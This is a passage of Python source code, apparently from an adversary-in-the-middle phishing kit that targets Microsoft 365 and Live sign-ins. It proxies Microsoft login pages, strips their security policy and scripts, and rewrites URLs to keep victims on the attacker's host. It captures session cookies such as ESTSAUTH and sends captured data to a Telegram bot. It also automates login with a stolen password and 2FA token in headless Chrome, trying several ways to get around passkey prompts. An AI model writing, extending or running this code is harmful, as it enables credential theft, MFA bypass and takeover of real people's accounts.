            
            # Prepare response headers and remove CSP restrictions
            response_headers = {}
            for key, value in resp.headers.items():
                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 
                                     'content-security-policy', 'content-security-policy-report-only', 
                                     'x-content-security-policy', 'x-webkit-csp']:
                    response_headers[key] = value
            
            # Add permissive CSP to allow our custom JavaScript
            response_headers['Content-Security-Policy'] = "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: *;"
            
            # Handle redirects properly by rewriting Location headers
            if 'Location' in response_headers:
                location = response_headers['Location']
                current_host = flask_request.host
                
                # Rewrite Microsoft URLs in Location header to point back to our proxy
                location_replacements = [
                    ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
                    ('https://login.live.com/', f'https://{current_host}/proxy/'),
                    ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
                    ('https://account.live.com/', f'https://{current_host}/proxy/'),
                    ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
                ]
                
                for old_url, new_url in location_replacements:
                    if location.startswith(old_url):
                        location = location.replace(old_url, new_url, 1)
                        self.log(f"[AiTM] Rewrote redirect location: {old_url} -> {new_url}")
                        break
                
                response_headers['Location'] = location
            
            # Rewrite response content to redirect Microsoft URLs back to our proxy
            content = resp.content
            
            # Check for empty or invalid content that could cause blank screens
            if not content or len(content) == 0:
                self.log(f"[AiTM] WARNING: Empty content received from Microsoft (status: {resp.status_code})")
                # For empty content, redirect to a known working URL
                if hasattr(self, 'user') and self.user:
                    personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                    is_personal = any(domain in self.user.lower() for domain in personal_domains)
                    
                    if is_personal:
                        retry_url = f"https://{flask_request.host}/proxy/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
                    else:
                        retry_url = f"https://{flask_request.host}/proxy/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
                    
                    return redirect(retry_url, code=302)
            
            if resp.headers.get('content-type', '').startswith('text/html'):
                try:
                    # Decode content and rewrite Microsoft URLs
                    content_str = content.decode('utf-8', errors='ignore')
                    current_host = flask_request.host
                    
                    # Log content size for debugging
                    self.log(f"[AiTM] Processing HTML content, size: {len(content_str)} chars")
                    
                    # FIDO endpoint blocking is now handled earlier in _proxy_to_microsoft()
                    # This section now only handles URL rewriting for normal content
                    
                    # CREATIVE SOLUTION: Strip JavaScript and use CSS-only Microsoft clone
                    # Remove all <script> tags to prevent domain validation failures
                    import re
                    
                    # Remove all JavaScript - it's designed to only work on Microsoft domains
                    content_str = re.sub(r'<script[^>]*>.*?</script>', '', content_str, flags=re.DOTALL | re.IGNORECASE)
                    content_str = re.sub(r'<script[^>]*/>', '', content_str, flags=re.IGNORECASE)
                    
                    # Remove problematic JavaScript references and events
                    content_str = re.sub(r'\son\w+\s*=\s*["\'][^"\']*["\']', '', content_str, flags=re.IGNORECASE)
                    content_str = re.sub(r'javascript:[^"\'>\s]*', '', content_str, flags=re.IGNORECASE)
                    
                    # Replace Microsoft URLs with our proxy URLs (keep this simple)
                    replacements = [
                        ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
                        ('https://login.live.com/', f'https://{current_host}/proxy/'),
                        ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
                        ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
                        ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
                        ('"https://login.live.com', f'"https://{current_host}/proxy'),
                        ("'https://login.live.com", f"'https://{current_host}/proxy"),
                        ('//login.microsoftonline.com/', f'//{current_host}/proxy/'),
                        ('//login.live.com/', f'//{current_host}/proxy/'),
                    ]
                    
                    self.log(f"[AiTM] Stripped JavaScript to prevent domain validation failures")
                    
                    # Add custom CSS and functionality to replace the stripped JavaScript
                    custom_enhancements = '''
<style>
/* Enhanced Microsoft-like styling to replace JavaScript functionality */
.form-group { margin-bottom: 20px; }
.form-control { 
    width: 100%; 
    padding: 12px; 
    border: 1px solid #ccc; 
    border-radius: 4px; 
    font-size: 14px;
    box-sizing: border-box;
}
.form-control:focus { 
    border-color: #0078d4; 
    outline: none; 
    box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
}
.btn-primary { 
    background-color: #0078d4; 
    border: none; 
    color: white; 
    padding: 12px 24px; 
    border-radius: 4px; 
    cursor: pointer; 
    font-size: 14px;
    width: 100%;
}
.btn-primary:hover { background-color: #106ebe; }
.btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }

/* Ensure the page displays properly without JavaScript */
[style*="display: none"], [style*="display:none"] { display: block !important; }
.hidden { display: block !important; }
.d-none { display: block !important; }
.visually-hidden { display: block !important; }

/* Force visibility of common Microsoft login elements */
.login-container, .login-box, .login-form, .form-container,
#lightbox, #loginForm, .login-paginated-page, .pagination-view,
.tile-container, .sign-in-box, .content, .main-content { 
    display: block !important; 
    visibility: visible !important;
    opacity: 1 !important;
}

/* Ensure body and html are visible */
html, body { 
    background-color: #f5f5f5 !important; 
    min-height: 100vh !important;
}
</style>
<script>
// Minimal safe JavaScript for basic form functionality (no domain checks)
document.addEventListener('DOMContentLoaded', function() {
    // Auto-focus first input
    var firstInput = document.querySelector('input[type="email"], input[type="text"], input[type="password"]');
    if (firstInput) firstInput.focus();
    
    // Basic form validation
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
        form.addEventListener('submit', function(e) {
            var inputs = form.querySelectorAll('input[required]');
            var valid = true;
            inputs.forEach(function(input) {
                if (!input.value.trim()) {
                    input.style.borderColor = '#d13438';
                    valid = false;
                } else {
                    input.style.borderColor = '#ccc';
                }
            });
            if (!valid) {
                e.preventDefault();
                return false;
            }
        });
    });
});
</script>'''
                    
                    # Insert our enhancements before closing </head> tag
                    content_str = content_str.replace('</head>', custom_enhancements + '</head>', 1)
                    
                    for old_url, new_url in replacements:
                        content_str = content_str.replace(old_url, new_url)
                    
                    content = content_str.encode('utf-8')
                    self.log(f"[AiTM] Enhanced page with custom CSS/JS and rewrote {len(replacements)} URL patterns")
                    
                    # Update Content-Length header since content size may have changed
                    response_headers['Content-Length'] = str(len(content))
                    
                except Exception as e:
                    self.log(f"[AiTM] Error rewriting URLs: {e}")
                    # Use original content if rewriting fails
                    pass
            else:
                # For non-HTML content, preserve original length
                if content:
                    response_headers['Content-Length'] = str(len(content))
            
            # Handle special cases that might cause blank screens
            if resp.status_code >= 400:
                self.log(f"[AiTM] Microsoft returned error status {resp.status_code}, content: {content.decode('utf-8', errors='ignore')[:200]}")
                
                # If Microsoft returns an error, we might want to redirect to a working URL
                if resp.status_code in [404, 400, 403]:
                    self.log(f"[AiTM] Error status {resp.status_code}, attempting fallback redirect")
                    if hasattr(self, 'user') and self.user:
                        personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                        is_personal = any(domain in self.user.lower() for domain in personal_domains)
                        
                        if is_personal:
                            fallback_url = f"https://{flask_request.host}/proxy/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
                        else:
                            fallback_url = f"https://{flask_request.host}/proxy/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
                        
                        return redirect(fallback_url, code=302)
            
            # Create Flask response
            flask_response = Response(
                content,
                status=resp.status_code,
                headers=response_headers
            )
            
            return flask_response
            
        except Exception as e:
            self.log(f"[AiTM] Proxy error: {e}")
            # Return error page or redirect
            return redirect("https://login.microsoftonline.com/", code=302)

    def _parse_cookie_header(self, cookie_header):
        """Parse a Set-Cookie header into components"""
        try:
            parts = cookie_header.split(';')
            if not parts:
                return {}
            
            # First part is name=value
            name_value = parts[0].strip()
            if '=' not in name_value:
                return {}
            
            name, value = name_value.split('=', 1)
            cookie = {'name': name.strip(), 'value': value.strip()}
            
            # Parse additional attributes
            for part in parts[1:]:
                part = part.strip()
                if '=' in part:
                    attr_name, attr_value = part.split('=', 1)
                    cookie[attr_name.lower()] = attr_value
                else:
                    cookie[part.lower()] = True
            
            return cookie
            
        except Exception as e:
            self.log(f"Error parsing cookie: {e}")
            return {}

    def _handle_captured_cookies(self, captured_cookies):
        """Handle captured cookies from the proxy"""
        try:
            # Store cookies in the AiTM manager if available
            if self.aitm_manager and self.aitm_manager.proxy:
                if not hasattr(self.aitm_manager.proxy, 'captured_data'):
                    self.aitm_manager.proxy.captured_data = {'cookies': [], 'credentials': {}, 'session_info': {}}
                
                self.aitm_manager.proxy.captured_data['cookies'].extend(captured_cookies)
            
            # Check for important Microsoft authentication cookies
            important_cookies = []
            for cookie_data in captured_cookies:
                cookie = cookie_data.get('parsed', {})
                if cookie.get('name'):
                    name = cookie['name']
                    if any(important in name.upper() for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'FPC']):
                        important_cookies.append(name)
            
            if important_cookies:
                # Check if this is a new significant capture (avoid spam)
                if not hasattr(self, 'last_cookie_notification_count'):
                    self.last_cookie_notification_count = 0
                
                current_count = len(important_cookies)
                if current_count > self.last_cookie_notification_count:
                    # Only send notification for meaningful increase
                    self.log(f"[AiTM] Significant cookies detected: {important_cookies}")
                    self.last_cookie_notification_count = current_count
                    
                    # Update the monitoring that we have meaningful data
                    if hasattr(self, 'aitm_results_sent') and not self.aitm_results_sent:
                        # Let the main monitoring thread handle sending results
                        # This prevents duplicate messages
                        self.log(f"[AiTM] Deferring to main monitoring thread for result reporting")
                else:
                    self.log(f"[AiTM] Duplicate cookie notification prevented (count: {current_count})")
            
        except Exception as e:
            self.log(f"Error handling captured cookies: {e}")

    def _validate_and_report_session(self):
        """DEPRECATED: Validate captured session and send full report - now handled by main monitoring thread"""
        # This function is disabled to prevent duplicate messages
        # All validation and reporting is now handled by the main monitoring thread
        self.log(f"[AiTM] _validate_and_report_session called but disabled to prevent duplicates")
        return


    def send_telegram(self, message: str | None = None, document_paths: list | None = None):
        """Send a Markdown message and/or upload documents to Telegram.

        Parameters
        ----------
        message : str | None
            Text to send. If None, no text message is sent.
        document_paths : list[str] | None
            Optional list of file paths to upload as documents (one request per file).
        """
        bot_token = getenv('TELEGRAM_BOT_TOKEN')
        chat_id = getenv('TELEGRAM_CHAT_ID')
        if not bot_token or not chat_id:
            return

        session_req = requests.Session()

        if message:
            try:
                url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'Markdown',
                }
                session_req.post(url, json=payload, timeout=15)
            except Exception:
                pass

        if document_paths:
            for fpath in document_paths:
                try:
                    if not os.path.exists(fpath):
                        continue
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    with open(fpath, 'rb') as fp:
                        files = {'document': (os.path.basename(fpath), fp)}
                        data = {'chat_id': chat_id}
                        session_req.post(url, data=data, files=files, timeout=30)
                except Exception as exc:
                    print(f"[telegram-upload] Failed to send {fpath}: {exc}")

    def perform_automated_login(self):
        """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
        email = getattr(self, 'user', None)
        password = getattr(self, 'captured_password', None)
        token = getattr(self, 'two_factor_token', None)
        if not all([email, password, token]):
            return [{"error": "Missing credentials", "email": email, "password": bool(password), "token": bool(token)}]

        driver = None
        opts = webdriver.ChromeOptions()
        def log(msg):
            print(f"[{datetime.datetime.utcnow().isoformat()}] SELENIUM: {msg}")

        opts.binary_location = os.getenv('CHROME_BIN', '/usr/bin/chromium')
        if not os.path.exists(opts.binary_location):
            alt = shutil.which('chromium') or shutil.which('chromium-browser') or '/usr/lib/chromium/chromium'
            opts.binary_location = alt
        log(f"Using chrome binary: {opts.binary_location}")
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-crash-reporter')
        opts.add_argument('--disable-extensions')
        opts.add_argument('--disable-features=SitePerProcess,OptimizationHints')
        # Disable WebAuthn so Microsoft does not offer password-less/FIDO flows
        opts.add_argument('--disable-features=WebAuthentication,WebAuthnConditionalUI')
        opts.add_argument('--window-size=1280,800')
        opts.add_argument('--disable-software-rasterizer')
        opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
        opts.add_argument('--no-zygote')

        # Allow tweaking global Selenium wait via env (default 60 s)
        WAIT_TIMEOUT = int(os.getenv('O365_WAIT_TIMEOUT', '60'))

        try:
            # Let Selenium Manager fetch the correct chromedriver automatically
            log("Launching Chrome via Selenium Manager…")
            driver = webdriver.Chrome(options=opts)
            driver.set_page_load_timeout(WAIT_TIMEOUT)
            log("Chrome WebDriver session started")

            from selenium.common.exceptions import TimeoutException, NoSuchElementException
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC

            wait = WebDriverWait(driver, WAIT_TIMEOUT)

            def element_present(by, selector, t=3):
                """Utility: return True if element located within t seconds."""
                try:
                    WebDriverWait(driver, t).until(EC.presence_of_element_located((by, selector)))
                    return True
                except Exception:
                    return False

            # Start with appropriate login flow based on account type
            log(f"Starting login flow for {email}")
            
            # Determine if this is a personal account
            personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
            is_personal = any(domain in email.lower() for domain in personal_domains)
            
            if is_personal:
                # For personal accounts, use login.live.com
                legacy_url = f"https://login.live.com/login.srf?username={email}"
                log(f"Using personal account login flow for {email}")
            else:
                # For organizational accounts, use login.microsoftonline.com
                legacy_url = f"https://login.microsoftonline.com/login.srf?username={email}"
                log(f"Using organizational account login flow for {email}")

            try:
                driver.get(legacy_url)
                time.sleep(2)

                # Sanity-check: make sure an email field is present; otherwise fall back.
                if not (element_present(By.NAME, 'loginfmt', 5) or element_present(By.ID, 'i0116', 5)):
                    raise Exception("Email field not detected on login page")

                log("Loaded login page successfully")
            except Exception as legacy_exc:
                log(f"Initial login flow failed ({legacy_exc}); falling back to generic flow")
                fallback_url = "https://login.live.com/" if is_personal else "https://login.microsoftonline.com/"
                driver.get(fallback_url)
                time.sleep(2)
            
            # Enter email
            try:
                email_field = driver.find_element(By.NAME, 'loginfmt')
                email_field.clear()
                email_field.send_keys(email)
                driver.find_element(By.ID, 'idSIButton9').click()
                log("Email entered and submitted")
                time.sleep(3)
            except Exception as e:
                log(f"Failed to enter email: {str(e)}")
                raise

            # Check current page and handle accordingly
            current_url = driver.current_url
            page_source = driver.page_source
            log(f"Current URL after email: {current_url}")
            
            # Check if we're on a FIDO/WebAuthn page
            fido_indicators = [
                'login-fido-view',
                'Face, fingerprint, PIN or security key',
                'CT_STR_CredentialPicker_Option_Passkey',
                'data-viewid="23"',
                'idDiv_SAOTCS_Proofs',
                'Windows Hello',
                'security key',
                'passkey',
                'biometric',
                'authenticator'
            ]
            
            is_fido_page = any(indicator in page_source for indicator in fido_indicators)
            
            if is_fido_page:
                log("Detected FIDO/WebAuthn page, implementing comprehensive bypass strategy")
                
                # Strategy 1: Look for bypass links and buttons
                bypass_selectors = [
                    # Text-based selectors
                    (By.LINK_TEXT, "Other ways to sign in"),
                    (By.PARTIAL_LINK_TEXT, "Other ways"),
                    (By.LINK_TEXT, "Sign in with a password instead"),
                    (By.PARTIAL_LINK_TEXT, "password instead"),
                    (By.LINK_TEXT, "Use a password"),
                    (By.PARTIAL_LINK_TEXT, "Use a password"),
                    (By.LINK_TEXT, "More choices"),
                    (By.PARTIAL_LINK_TEXT, "More choices"),
                    (By.LINK_TEXT, "Sign-in options"),
                    (By.PARTIAL_LINK_TEXT, "Sign-in options"),
                    
                    # ID-based selectors
                    (By.ID, "idA_PWD_SwitchToPassword"),
                    (By.ID, "idA_PWD_UseDifferentAccount"),
                    (By.ID, "idBtn_Back"),
                    (By.ID, "idBtn_Cancel"),
                    
                    # CSS selectors
                    (By.CSS_SELECTOR, "a[id*='SwitchToPassword']"),
                    (By.CSS_SELECTOR, "a[href*='password']"),
                    (By.CSS_SELECTOR, "a[href*='LoginOptions']"),
                    (By.CSS_SELECTOR, "input[value='Back']"),
                    (By.CSS_SELECTOR, "button[value='Back']"),
                    (By.CSS_SELECTOR, "input[value='Cancel']"),
                    (By.CSS_SELECTOR, "button[value='Cancel']"),
                    (By.CSS_SELECTOR, ".text-13 a"),  # Small links often contain bypass options
                    
                    # XPath selectors
                    (By.XPATH, "//a[contains(text(), 'password')]"),
                    (By.XPATH, "//a[contains(text(), 'Other')]"),
                    (By.XPATH, "//a[contains(text(), 'different')]"),
                    (By.XPATH, "//a[contains(@href, 'password')]"),
                    (By.XPATH, "//a[contains(@href, 'LoginOptions')]"),
                    (By.XPATH, "//input[@type='button' and (@value='Back' or @value='Cancel')]"),
                    (By.XPATH, "//button[contains(text(), 'Back') or contains(text(), 'Cancel')]")
                ]
                
                bypass_clicked = False
                for by, selector in bypass_selectors:
                    try:
                        elements = driver.find_elements(by, selector)
                        for element in elements:
                            if element and element.is_displayed() and element.is_enabled():
                                # Scroll element into view
                                driver.execute_script("arguments[0].scrollIntoView(true);", element)
                                time.sleep(0.5)
                                element.click()
                                log(f"Clicked bypass option with {by}: {selector}")
                                bypass_clicked = True
                                time.sleep(3)
                                break
                    except Exception as e:
                        log(f"Failed to click {by}: {selector} - {str(e)}")
                        continue
                    
                    if bypass_clicked:
                        break
                
                # Strategy 2: Try JavaScript navigation if clicking failed
                if not bypass_clicked:
                    log("Click bypass failed, trying JavaScript navigation")
                    try:
                        # Try to find and click hidden elements via JavaScript
                        js_commands = [
                            "document.querySelector('#idBtn_Back')?.click()",
                            "document.querySelector('[value=\"Back\"]')?.click()",
                            "document.querySelector('a[href*=\"password\"]')?.click()",
                            "Array.from(document.querySelectorAll('a')).find(a => a.textContent.includes('Other'))?.click()",
                            "Array.from(document.querySelectorAll('a')).find(a => a.textContent.includes('password'))?.click()"
                        ]
                        
                        for js_cmd in js_commands:
                            try:
                                driver.execute_script(js_cmd)
                                time.sleep(2)
                                if 'login-fido-view' not in driver.page_source:
                                    log(f"JavaScript bypass successful: {js_cmd}")
                                    bypass_clicked = True
                                    break
                            except:
                                continue
                    except Exception as e:
                        log(f"JavaScript bypass failed: {str(e)}")
                
                # Strategy 3: Force navigation with LoginOptions parameter
                if not bypass_clicked:
                    log("Attempting forced navigation with LoginOptions parameter")
                    try:
                        # Parse current URL to extract parameters
                        from urllib.parse import urlparse, parse_qs, urlencode
                        parsed_url = urlparse(current_url)
                        query_params = parse_qs(parsed_url.query)
                        
                        # Add LoginOptions=1 to force password option
                        query_params['LoginOptions'] = ['1']
                        query_params['username'] = [email]
                        
                        # Construct new URL
                        new_query = urlencode(query_params, doseq=True)
                        if 'login.live.com' in current_url:
                            new_url = f"https://login.live.com/ppsecure/post.srf?{new_query}"
                        else:
                            new_url = f"https://login.microsoftonline.com/common/login?{new_query}"
                        
                        driver.get(new_url)
                        log(f"Navigated to: {new_url}")
                        time.sleep(3)
                        bypass_clicked = True
                    except Exception as e:
                        log(f"URL manipulation failed: {str(e)}")
                
                # Strategy 4: Browser back and retry
                if not bypass_clicked:
                    log("Attempting browser back navigation")
                    try:
                        driver.back()
                        time.sleep(2)
                        # Re-enter email with password preference
                        email_field = driver.find_element(By.NAME, 'loginfmt')
                        email_field.clear()
                        email_field.send_keys(email)
                        # Try to find and click password option before submitting
                        try:
                            pwd_option = driver.find_element(By.CSS_SELECTOR, "[data-test-id='password-credential-type']")
                            pwd_option.click()
                        except:
                            pass
                        driver.find_element(By.ID, 'idSIButton9').click()
                        time.sleep(3)
                        bypass_clicked = True
                    except Exception as e:
                        log(f"Browser back strategy failed: {str(e)}")
                
                # Strategy 5: Direct POST to password endpoint
                if not bypass_clicked:
                    log("Attempting direct navigation to password endpoints")
                    password_urls = [
                        f"https://login.microsoftonline.com/common/login?username={email}&LoginOptions=1",
                        f"https://login.live.com/ppsecure/post.srf?username={email}&LoginOptions=1",
                        f"https://login.microsoftonline.com/common/oauth2/authorize?username={email}&prompt=login",
                        f"https://login.live.com/oauth20_authorize.srf?username={email}&display=page"
                    ]
                    
                    for pwd_url in password_urls:
                        try:
                            driver.get(pwd_url)
                            time.sleep(3)
                            if 'passwd' in driver.page_source or 'password' in driver.page_source.lower():
                                log(f"Successfully navigated to password page via: {pwd_url}")
                                bypass_clicked = True
                                break
                        except:
                            continue
            
            # Now try to enter password with comprehensive retry logic
            password_entered = False
            max_password_attempts = 5
            
            for main_attempt in range(max_password_attempts):
                log(f"Password entry attempt {main_attempt + 1}/{max_password_attempts}")
                
                # Check if we're still on FIDO page and need another bypass attempt
                current_page = driver.page_source
                if any(indicator in current_page for indicator in fido_indicators):
                    log("Still on FIDO page, attempting additional bypass")
                    
                    # Try clicking any visible button that might help
                    try:
                        all_buttons = driver.find_elements(By.TAG_NAME, "button") + driver.find_elements(By.TAG_NAME, "input")
                        for btn in all_buttons:
                            btn_text = btn.get_attribute("value") or btn.text
                            if btn_text and any(word in btn_text.lower() for word in ["back", "cancel", "other", "password", "different"]):
                                if btn.is_displayed() and btn.is_enabled():
                                    btn.click()
                                    log(f"Clicked button: {btn_text}")
                                    time.sleep(2)
                                    break
                    except:
                        pass
                    
                    # Force refresh with password parameter
                    try:
                        current_url = driver.current_url
                        if "LoginOptions" not in current_url:
                            separator = "&" if "?" in current_url else "?"
                            driver.get(f"{current_url}{separator}LoginOptions=1")
                            time.sleep(2)
                    except:
                        pass
                
                # Comprehensive password field selectors
                password_selectors = [
                    # Standard selectors
                    (By.NAME, 'passwd'),
                    (By.ID, 'i0118'),
                    (By.ID, 'passwordInput'),
                    (By.ID, 'Password'),
                    
                    # CSS selectors
                    (By.CSS_SELECTOR, 'input[type="password"]'),
                    (By.CSS_SELECTOR, 'input[name="passwd"]'),
                    (By.CSS_SELECTOR, 'input[name="password"]'),
                    (By.CSS_SELECTOR, 'input[name="Password"]'),
                    (By.CSS_SELECTOR, '#i0118'),
                    (By.CSS_SELECTOR, '#passwordInput'),
                    (By.CSS_SELECTOR, 'input[placeholder*="Password"]'),
                    (By.CSS_SELECTOR, 'input[placeholder*="password"]'),
                    (By.CSS_SELECTOR, 'input[aria-label*="password"]'),
                    (By.CSS_SELECTOR, 'input[aria-label*="Password"]'),
                    (By.CSS_SELECTOR, '.form-control[type="password"]'),
                    (By.CSS_SELECTOR, 'input.text[type="password"]'),
                    
                    # XPath selectors
                    (By.XPATH, "//input[@type='password']"),
                    (By.XPATH, "//input[contains(@name, 'pass')]"),
                    (By.XPATH, "//input[contains(@id, 'pass')]"),
                    (By.XPATH, "//input[contains(@placeholder, 'Password')]"),
                    (By.XPATH, "//input[contains(@placeholder, 'password')]"),
                    (By.XPATH, "//input[contains(@aria-label, 'password')]"),
                    (By.XPATH, "//input[@autocomplete='current-password']"),
                    (By.XPATH, "//input[@autocomplete='password']")
                ]
                
                # Try each selector
                for by, selector in password_selectors:
                    try:
                        # Use find_elements to avoid exceptions
                        elements = driver.find_elements(by, selector)
                        for password_field in elements:
                            if password_field.is_displayed():
                                log(f"Found password field with {by}: {selector}")
                                
                                # Ensure field is ready
                                driver.execute_script("arguments[0].scrollIntoView(true);", password_field)
                                time.sleep(0.5)
                                
                                # Try multiple methods to enter password
                                try:
                                    # Method 1: Standard clear and send_keys
                                    password_field.clear()
                                    password_field.send_keys(password)
                                except:
                                    try:
                                        # Method 2: JavaScript
                                        driver.execute_script(f"arguments[0].value = '{password}';", password_field)
                                    except:
                                        try:
                                            # Method 3: Click first, then type
                                            password_field.click()
                                            password_field.send_keys(password)
                                        except:
                                            continue
                                
                                log("Password entered, looking for submit button")
                                
                                # Comprehensive sign-in button selectors
                                signin_selectors = [
                                    (By.ID, 'idSIButton9'),
                                    (By.ID, 'submitButton'),
                                    (By.ID, 'SignIn'),
                                    (By.CSS_SELECTOR, 'input[type="submit"]'),
                                    (By.CSS_SELECTOR, 'button[type="submit"]'),
                                    (By.CSS_SELECTOR, 'input[value="Sign in"]'),
                                    (By.CSS_SELECTOR, 'input[value="Next"]'),
                                    (By.CSS_SELECTOR, 'input[value="Submit"]'),
                                    (By.CSS_SELECTOR, 'button:contains("Sign in")'),
                                    (By.CSS_SELECTOR, 'button:contains("Next")'),
                                    (By.CSS_SELECTOR, '.btn-primary'),
                                    (By.CSS_SELECTOR, '.win-button'),
                                    (By.XPATH, "//input[@type='submit']"),
                                    (By.XPATH, "//button[@type='submit']"),
                                    (By.XPATH, "//input[contains(@value, 'Sign')]"),
                                    (By.XPATH, "//input[contains(@value, 'Next')]"),
                                    (By.XPATH, "//button[contains(text(), 'Sign')]"),
                                    (By.XPATH, "//button[contains(text(), 'Next')]")
                                ]
                                
                                button_clicked = False
                                for s_by, s_selector in signin_selectors:
                                    try:
                                        btns = driver.find_elements(s_by, s_selector)
                                        for signin_btn in btns:
                                            if signin_btn.is_displayed() and signin_btn.is_enabled():
                                                signin_btn.click()
                                                log(f"Clicked sign in button with {s_by}: {s_selector}")
                                                password_entered = True
                                                button_clicked = True
                                                break
                                    except:
                                        continue
                                    
                                    if button_clicked:
                                        break
                                
                                # If no button clicked, try Enter key
                                if not button_clicked:
                                    try:
                                        password_field.send_keys(Keys.RETURN)
                                        log("Pressed Enter key on password field")
                                        password_entered = True
                                    except:
                                        pass
                                
                                if password_entered:
                                    break
                    except Exception as e:
                        log(f"Error with selector {by}: {selector} - {str(e)}")
                        continue
                    
                    if password_entered:
                        break
                
                if password_entered:
                    log("Password submitted, waiting for response")
                    time.sleep(5)
                    
                    # Check if we're past the password page
                    new_page = driver.page_source
                    if 'passwd' not in new_page and 'password' not in new_page.lower():
                        log(f"Successfully moved past password page. Current URL: {driver.current_url}")
                        break
                    else:
                        log("Still on password page, will retry")
                        password_entered = False
                
                # Wait before next attempt
                if not password_entered and main_attempt < max_password_attempts - 1:
                    log(f"Password not entered, waiting before retry {main_attempt + 2}")
                    time.sleep(3)
            
            if not password_entered:
                log("Failed to enter password after all attempts")
                # Capture comprehensive debug information
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                debug_html = f'/tmp/o365_password_fail_{timestamp}.html'
                debug_png = f'/tmp/o365_password_fail_{timestamp}.png'
                
                # Save page source
                with open(debug_html, 'w', encoding='utf-8') as fp:
                    fp.write(driver.page_source)
                
                # Save screenshot
                driver.save_screenshot(debug_png)
                
                # Log all form elements for debugging
                try:
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    inputs = driver.find_elements(By.TAG_NAME, "input")
                    log(f"Found {len(forms)} forms and {len(inputs)} input elements")
                    for i, inp in enumerate(inputs):
                        log(f"Input {i}: type={inp.get_attribute('type')}, name={inp.get_attribute('name')}, id={inp.get_attribute('id')}")
                except:
                    pass
                
                raise Exception(f"Could not enter password after {max_password_attempts} attempts. Debug files: {debug_html}, {debug_png}")

            # Handle 2FA
            log("Looking for 2FA input fields")
            
            # Wait for any of the expected next-stage markers to become visible
            try:
                wait.until(
                    EC.any_of(
                        EC.presence_of_element_located((By.ID, 'otcFrame')),
                        EC.presence_of_element_located((By.ID, 'idDiv_SAOTCS_Proofs')),
                        EC.presence_of_element_located((By.ID, 'idSubmit_SAOTCC_Continue')),
                        EC.presence_of_element_located((By.NAME, 'otc')),
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="otcInput0"]')),
                    )
                )
                log("Found 2FA stage marker")
            except TimeoutException:
                log(f"No stage-marker element appeared after {WAIT_TIMEOUT}s – proceeding with fallback selectors")

            # If a verification-method chooser is present, click the first Continue/Send-code button
            try:
                choice_btns = driver.find_elements(By.ID, 'idSubmit_SAOTCC_Continue') or \
                              driver.find_elements(By.CSS_SELECTOR, 'input[id^="idSubmit_SAOTCC"]')
                if choice_btns:
                    choice_btns[0].click()
                    log("Clicked verification method continue button")
                    time.sleep(2)
            except Exception:
                pass  # No choice page, proceed

            # If an iframe with the OTP box loads, switch context to it
            try:
                if element_present(By.ID, 'otcFrame', 5):
                    driver.switch_to.frame(driver.find_element(By.ID, 'otcFrame'))
                    log("Switched to OTP iframe")
            except Exception:
                pass

            # Locate the OTP input element using a broad selector list
            otp_selectors = [
                (By.NAME, 'otc'),
                (By.NAME, 'otcInput0'),
                (By.ID, 'idTxtBx_SAOTP_OTC'),
                (By.ID, 'idTxtBx_SAOTCC_OTC'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTP"]'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTCC"]'),
                (By.CSS_SELECTOR, 'input[type="tel"]'),
                (By.CSS_SELECTOR, 'input[type="text"]'),
            ]

            token_input = None
            for by, sel in otp_selectors:
                try:
                    log(f"Looking for OTP input with {by}: {sel}")
                    token_input = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by, sel))
                    )
                    log(f"Found OTP input with {by}: {sel}")
                    break
                except TimeoutException:
                    continue

            if token_input:
                token_input.clear()
                token_input.send_keys(token)
                log(f"Entered 2FA token: {token}")
                # The verify/Next button often retains the same ID inside or outside iframe
                try:
                    driver.find_element(By.ID, 'idSIButton9').click()
                    log("Clicked verify button")
